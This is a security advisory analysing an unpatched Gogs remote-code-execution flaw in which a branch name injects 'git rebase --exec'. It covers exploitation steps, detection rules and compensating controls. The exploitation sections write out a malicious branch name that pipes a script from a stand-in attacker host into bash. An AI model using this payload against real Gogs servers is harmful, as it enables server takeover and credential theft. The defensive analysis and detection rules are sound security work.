# Gogs Zero-Day RCE  Argument Injection via git rebase (Unpatched)

**CVE:** Not yet assigned (CWE-88  Argument Injection)
**CVSS Score:** 9.4 (Critical)  Rapid7 Labs assessment
**Discovered By:** Rapid7 Labs (Jonah Burgess)
**Reported to Vendor:** March 17, 2026
**Public Disclosure:** May 28, 2026
**Patch Status:** UNPATCHED  no fix available as of June 6, 2026 (70+ days after report)
**Affected Versions:** Gogs 0.14.2, Gogs 0.15.0+dev (latest release versions)
**Internet-Exposed Instances:** 1,100+ (Shodan)
**Analysis Date:** 2026-06-06
**Related:** Second RCE in Gogs in 6 months (CVE-2025-8110 exploited in wild, December 2025)

---

## 1. Executive Summary

Rapid7 Labs disclosed a critical unpatched argument injection vulnerability in Gogs, a widely used open-source self-hosted Git service, on May 28, 2026  70 days after responsible disclosure to the vendor on March 17. No patch exists. No CVE has been assigned. The vulnerability is present in the latest release versions of Gogs and affects all default-configured instances.

The flaw resides in the pull request merge path. When a pull request uses the Rebase before merging merge strategy, Gogs constructs a git rebase command using the pull request branch name. The branch name is passed to git rebase without a `--` delimiter to terminate option parsing, allowing a malicious branch name containing `--exec=<command>` to inject an arbitrary shell command that executes with the privileges of the Gogs server process.

The practical exploitation path on a default Gogs deployment takes under 60 seconds: create an account via open registration, create a repository, push a branch with a malicious name, open a pull request, and trigger the rebase merge. The Gogs server process executes the injected command. An attacker who achieves code execution as the Gogs process user can access every repository on the instance, dump credentials accessible to the service, and move laterally to other network-accessible systems.

This is the second critical Gogs RCE in six months. CVE-2025-8110, a different RCE discovered by Wiz Research in December 2025, was exploited in zero-day attacks that compromised over 700 instances before a patch was available. History suggests exploitation of the current flaw is a question of when, not if.

| Property | Value |
|---|---|
| **Verdict** | Critical  Unpatched Authenticated RCE via git rebase Argument Injection |
| **CVE** | Not yet assigned |
| **CVSS** | 9.4 (Critical)  Rapid7 |
| **Auth Required** | Yes  basic user account (obtainable via open registration) |
| **Admin Privileges** | Not required |
| **Patch Available** | No  70+ days after responsible disclosure |
| **Default Config Vulnerable** | Yes  open registration enabled by default |
| **Internet-Exposed** | 1,100+ instances (Shodan) |
| **Related Prior CVE** | CVE-2025-8110  exploited in wild, December 2025 |

---

## 2. Product Background

Gogs is an open-source self-hosted Git service written in Go, positioned as a lightweight alternative to GitHub Enterprise or GitLab. Its minimal system requirements and ease of deployment make it popular in environments where a full GitLab deployment is considered excessive  small development teams, research groups, universities, and organisations with air-gapped or restricted network environments.

The key operational characteristic that amplifies this vulnerability's risk: Gogs is frequently exposed to the internet to enable remote collaboration. Unlike an internal-only Git service, an internet-exposed Gogs instance is reachable by any attacker who can identify it via Shodan or a direct scan.

Gogs ships with open registration enabled by default. On a default-configured, internet-exposed instance, an attacker needs no prior access  they register an account, then exploit the vulnerability.

**Repository history:** Over 50,000 GitHub stars. Thousands of on-premises and cloud deployments globally. A previous RCE (CVE-2025-8110) was exploited in December 2025, compromising over 700 instances before patching.

---

## 3. Vulnerability Details

### 3.1 Root Cause  Argument Injection in git rebase

The vulnerability is a CWE-88 argument injection in the pull request merge path. When a pull request uses the Rebase before merging merge strategy, Gogs constructs a system call to git rebase using the pull request branch name as input.

Git rebase interprets options that begin with `--`. Without a `--` delimiter to signal the end of options, a branch name that begins with `--` is parsed by git rebase as a command-line flag rather than as a branch name.

The `--exec` flag in git rebase executes a shell command after each commit is applied during the rebase operation.

```
Normal git rebase command:
git rebase <upstream_branch> <feature_branch>
→ git rebase main feature/my-new-feature
→ feature/my-new-feature treated as branch name, safe

Malicious git rebase command (constructed from attacker branch name):
git rebase main --exec=<attacker_command>
→ --exec=<attacker_command> interpreted as a flag
→ <attacker_command> executes on the server as the Gogs process user
```

### 3.2 The Vulnerable Code Path (Rapid7 Analysis)

```go
// VULNERABLE  Gogs pull request merge handler (simplified)
// The branch name from the pull request is passed directly
// without a "--" terminator to prevent option injection

func MergeRebase(pr *PullRequest) error {
    cmd := exec.Command("git", "rebase",
        pr.BaseBranch,
        pr.HeadBranch,   // ← attacker-controlled, no "--" terminator
    )
    return cmd.Run()
}

// SECURE  fixed version would use "--" to terminate options:
func MergeRebase(pr *PullRequest) error {
    cmd := exec.Command("git", "rebase",
        pr.BaseBranch,
        "--",            // ← terminates option parsing
        pr.HeadBranch,   // interpreted as branch name, not option
    )
    return cmd.Run()
}
```

### 3.3 Exploitation Variants

Rapid7 documented two exploitation paths depending on the attacker's access level:

**Variant 1  Open Registration (Default):**
On default Gogs deployments with open registration enabled:
1. Register a new user account via `/user/sign_up`
2. Create a new repository
3. Push a branch with a malicious name (e.g., `--exec=curl attacker.com/shell.sh|bash`)
4. Create a pull request from the malicious branch
5. Trigger the Rebase before merging merge operation
6. Gogs server executes the injected command

**Variant 2  Existing Write Access:**
If an attacker has write access to any repository where rebase merging is already enabled:
1. Push a branch with a malicious name
2. Open a pull request with that branch
3. Trigger the rebase merge
4. Gogs server executes the injected command

This variant is relevant even on Gogs instances where registration is restricted  any insider or compromised account with write access to a rebase-enabled repository can escalate to server-level code execution.

### 3.4 Execution Context

The injected command executes as the Gogs server process user  the operating system user that the Gogs daemon runs as. On many deployments this is a dedicated `git` or `gogs` user. On poorly configured deployments it may be root.

From the Gogs process user context, an attacker can access:
- Every repository stored on the instance (all repositories are readable by the Gogs process)
- Credentials stored in the Gogs database (database connection string, admin passwords, API tokens)
- SSH keys accessible to the service user
- Any files readable by the process user on the host

---

## 4. Attack Chain

```
Attacker identifies internet-exposed Gogs instance
(Shodan: product:"Gogs" or http.title:"Gogs")
                        |
                        v
[STAGE 1: Account Creation (if open registration enabled)]
POST /user/sign_up
Register new account  no email verification on default config
Time: ~10 seconds
                        |
                        v
[STAGE 2: Repository and Malicious Branch Creation]
Create new repository via Gogs UI or API
Push branch with malicious name:
  git checkout -b "--exec=curl${IFS}http://attacker.com/shell.sh|bash"
  git push origin "--exec=curl${IFS}http://attacker.com/shell.sh|bash"
Time: ~20 seconds
                        |
                        v
[STAGE 3: Pull Request Creation]
Create pull request from malicious branch to main
Trigger Rebase before merging merge operation
                        |
                        v
[STAGE 4: Server-Side Code Execution]
Gogs constructs: git rebase main --exec=curl...
git rebase interprets --exec as flag
Shell command executes as Gogs process user
                        |
                        v
[STAGE 5: Post-Exploitation]
Access all repositories on the instance
Dump Gogs database (credentials, API tokens, user data)
Read SSH keys accessible to Gogs process
Install persistent backdoor or reverse shell
Lateral movement to network-accessible systems
Supply chain risk: tamper with any hosted repository's code
```

---

## 5. Why No Patch After 70+ Days

Rapid7 reported this vulnerability to Gogs maintainers on March 17, 2026. Despite multiple follow-ups, no patch has been released as of June 6, 2026.

The absence of a patch after 70+ days raises legitimate concerns about the Gogs project's security response capacity. This is not the first time this has happened:

- CVE-2024-55947 (symlink RCE)  patched, but fix was incomplete
- CVE-2025-8110 (bypass of CVE-2024-55947 fix)  active exploitation while maintainers were "working on a fix"
- Current argument injection  reported March 17, still unpatched June 6

Organisations relying on Gogs must assume indefinite vulnerability and implement compensating controls or migrate. As Rapid7's analysis states: "The absence of a patch 70+ days after responsible disclosure signals a fundamental security posture failure."

---

## 6. Self-Hosted Git Series Context

This vulnerability should be read alongside the Gitea CVE-2026-27771 analysis in this repository. Both vulnerabilities affect self-hosted Git alternatives to GitHub/GitLab. Both have significant exposure on the internet. Both represent risks that organisations accepted when they chose self-hosted Git infrastructure.

| Product | CVE | Type | Status |
|---|---|---|---|
| Gitea | CVE-2026-27771 | Private container registry bypass | Patched  v1.26.2 |
| Gogs | Not yet assigned | Authenticated RCE via argument injection | Unpatched |
| GitHub Enterprise | CVE-2026-3854 | git push injection RCE | Patched |

The pattern across all three: self-hosted Git infrastructure is a consistently targeted attack surface. Organisations that operate it should treat it with the same security rigour as any other internet-exposed service.

---

## 7. MITRE ATT&CK Mapping

| ID | Technique | Notes |
|---|---|---|
| T1190 | Exploit Public-Facing Application | Internet-exposed Gogs instance |
| T1059.004 | Unix Shell | Shell command injected via --exec flag |
| T1136.001 | Create Account: Local Account | Register via open registration as first step |
| T1552.001 | Credentials in Files | Database credentials, SSH keys accessible post-RCE |
| T1213 | Data from Information Repositories | All hosted repositories accessible |
| T1565.001 | Stored Data Manipulation | Tamper with any hosted repository's code |
| T1021.004 | Remote Services: SSH | Lateral movement via harvested SSH keys |
| T1543.002 | Create/Modify System Process | Persistence via systemd/cron post-RCE |

---

## 8. Detection Recommendations

### 8.1 Check Exposure

```bash
# Check if Gogs is internet-exposed
ss -tnlp | grep :3000
# 0.0.0.0:3000 or :::3000 = exposed to all interfaces

# Check if open registration is enabled
grep "DISABLE_REGISTRATION" /path/to/gogs/custom/conf/app.ini
# If not present or set to false = open registration enabled

# Check current Gogs version
gogs --version
# Affected: 0.14.2, 0.15.0+dev
```

### 8.2 Monitor for Exploitation Indicators

```bash
# Monitor Gogs access logs for malicious branch names
# Look for -- in branch names in git push operations
grep "refs/heads/--" /var/log/gogs/gogs.log 2>/dev/null

# Monitor for suspicious shell commands spawned by Gogs process
# Using auditd:
auditctl -a always,exit -F arch=b64 -S execve \
  -F ppid=$(pgrep gogs) -k gogs_child_exec

# Check auditd log for Gogs child processes
ausearch -k gogs_child_exec | grep -v "git"
# Any non-git process spawned by Gogs is suspicious

# Monitor for outbound network connections from Gogs process
ss -tnp | grep $(pgrep gogs) | grep -v "localhost\|127.0.0.1"
```

### 8.3 Runtime Detection (Falco)

```yaml
# Falco rule  detect unexpected process spawning by Gogs
- rule: Gogs Server Unexpected Child Process
  desc: Detects Gogs spawning unexpected processes that may indicate
        argument injection exploitation via git rebase --exec
  condition: >
    spawned_process and
    proc.pname = "gogs" and
    proc.name != "git" and
    proc.name != "ssh" and
    proc.name != "gogs"
  output: >
    Unexpected process spawned by Gogs (proc.name=%proc.name
     proc.cmdline=%proc.cmdline proc.pid=%proc.pid
     user=%user.name container=%container.name)
  priority: CRITICAL
  tags: [host, git, rce, gogs]
```

### 8.4 KQL (Microsoft Sentinel)

```kusto
// Gogs Zero-Day RCE Detection

// Detect unexpected child processes from Gogs
DeviceProcessEvents
| where InitiatingProcessFileName =~ "gogs"
| where FileName !in~ ("git", "ssh", "gogs")
| project TimeGenerated, DeviceName, FileName,
          ProcessCommandLine, InitiatingProcessFileName,
          InitiatingProcessCommandLine, AccountName
| order by TimeGenerated desc

// Detect outbound connections from Gogs process to unexpected destinations
DeviceNetworkEvents
| where InitiatingProcessFileName =~ "gogs"
| where RemoteIPType == "Public"
| where RemotePort !in (22, 443, 80)
| project TimeGenerated, DeviceName, RemoteIP, RemotePort,
          RemoteUrl, InitiatingProcessCommandLine
| order by TimeGenerated desc

// Hunt for -- in git branch push events in Gogs logs
// Requires Gogs log ingestion into Sentinel
Syslog
| where ProcessName == "gogs"
| where SyslogMessage contains "refs/heads/--"
| project TimeGenerated, Computer, SyslogMessage
| order by TimeGenerated desc
```

### 8.5 Sigma Rule

```yaml
title: Gogs Argument Injection RCE via git rebase (Unpatched Zero-Day)
id: u8v9w0x1-2y3z-4a5b-6c7d-8e9f0g1h2i3j
status: experimental
description: >
  Detects potential exploitation of the unpatched Gogs argument injection
  zero-day discovered by Rapid7 Labs (reported March 17, 2026, still
  unpatched as of June 2026). Key indicator: Gogs spawning non-git
  processes, consistent with --exec flag injection via malicious branch name.
author: Fredrick
date: 2026-06-06
references:
  - https://www.rapid7.com/blog/post/ve-authenticated-rce-via-argument-injection-gogs-unfixed/
  - https://thehackernews.com/2026/05/critical-gogs-rce-vulnerability-lets.html
  - https://www.bleepingcomputer.com/news/security/new-gogs-zero-day-flaw-lets-hackers-get-remote-code-execution/
logsource:
  category: process_creation
  product: linux
detection:
  selection_unexpected_child:
    ParentImage|endswith: '/gogs'
    Image|endswith:
      - '/bash'
      - '/sh'
      - '/curl'
      - '/wget'
      - '/python'
      - '/python3'
      - '/nc'
  condition: selection_unexpected_child
falsepositives:
  - Legitimate Gogs hooks that spawn shell scripts (review and allowlist)
level: critical
tags:
  - attack.initial_access
  - attack.t1190
  - attack.execution
  - attack.t1059.004
```

---

## 9. Remediation

### 9.1 No Patch Available  Apply Compensating Controls Immediately

```ini
# Edit Gogs configuration: /path/to/gogs/custom/conf/app.ini

[service]
; Disable open registration  prevents unauthenticated exploitation path
DISABLE_REGISTRATION = true
REGISTER_EMAIL_CONFIRM = false
REGISTER_MANUAL_CONFIRM = false

[repository]
; Prevent new repository creation  limits Variant 1 attack path
MAX_CREATION_LIMIT = 0
; Note: This does NOT protect against Variant 2
; Attackers with existing write access to rebase-enabled repos can still exploit

; Restart Gogs after configuration changes
```

```bash
# Restart Gogs after configuration changes
sudo systemctl restart gogs
# Or: docker restart <gogs_container>
```

### 9.2 Network-Level Isolation

```bash
# Immediately restrict Gogs to trusted internal IPs only
# Do NOT leave internet-exposed while unpatched

# iptables example
iptables -A INPUT -p tcp --dport 3000 -s <trusted_ip_range> -j ACCEPT
iptables -A INPUT -p tcp --dport 3000 -j DROP

# If remote access is required  use SSH tunnelling or VPN
# ssh -L 3000:localhost:3000 user@gogs-server
```

### 9.3 Disable Rebase Merge Strategy

```ini
# If rebase merging is not required, disable it at the instance level
# This removes the vulnerable code path entirely

[repository.pull-request]
; Disable rebase merging  removes the vulnerable path
DEFAULT_MERGE_STYLE = merge
; Or: squash
; Rebase option will still appear in UI but can be blocked at process level
```

### 9.4 Migration Consideration

Given that this is the second critical unpatched RCE in Gogs in six months, with a pattern of incomplete fixes and slow vendor response, organisations should evaluate migration to an actively maintained alternative:

| Alternative | Notes |
|---|---|
| Gitea | Active security team, rapid response  patch for CVE-2026-27771 released same day as disclosure |
| Forgejo | Gitea fork, active maintenance |
| GitLab CE | Full-featured, strong security track record |
| Forgejo | Strong community, responsive maintainers |

If migration is planned, complete it before re-enabling broad access to the Gogs instance.

---

## 10. Prioritisation Guidance

| Scenario | Risk | Action |
|---|---|---|
| Internet-exposed, open registration enabled | 🔴 Critical | Take offline or restrict to VPN immediately |
| Internet-exposed, registration disabled | 🔴 High | Restrict to trusted IPs, monitor for auth'd exploitation |
| Internal only, open registration | 🟠 High | Disable registration, monitor Gogs child processes |
| Internal only, restricted registration | 🟡 Medium | Apply config controls, monitor, plan migration |

---

## 11. Timeline

| Date | Event |
|---|---|
| **December 2025** | CVE-2025-8110 exploited in wild  700+ Gogs instances compromised |
| **March 17, 2026** | Rapid7 reports argument injection flaw to Gogs maintainers |
| **May 28, 2026** | Rapid7 publishes disclosure  no patch in 70 days |
| **May 28 onwards** | Broad coverage: BleepingComputer, The Hacker News, Gridinsoft, runZero |
| **June 1, 2026** | Rapid7 adds vulnerability check for customers |
| **June 6, 2026** | Still unpatched. This analysis. |

---

## 12. References

| Source | URL |
|---|---|
| Rapid7 Labs Primary Disclosure | https://www.rapid7.com/blog/post/ve-authenticated-rce-via-argument-injection-gogs-unfixed/ |
| The Hacker News | https://thehackernews.com/2026/05/critical-gogs-rce-vulnerability-lets.html |
| BleepingComputer | https://www.bleepingcomputer.com/news/security/new-gogs-zero-day-flaw-lets-hackers-get-remote-code-execution/ |
| runZero Exposure Analysis | https://www.runzero.com/blog/gogs/ |
| Gridinsoft Technical Breakdown | https://blog.gridinsoft.com/gogs-rce-zero-day-open-registration/ |
| Undercode Testing (PoC Analysis) | https://undercodetesting.com/critical-gogs-zero-day-cvss-94-fully-automated-rce-exploit-in-seconds-no-patch-available-video/ |
| CVE-2025-8110 (Prior Gogs RCE) | https://www.darkreading.com/vulnerabilities-threats/attackers-exploited-gogs-zero-day-months |

---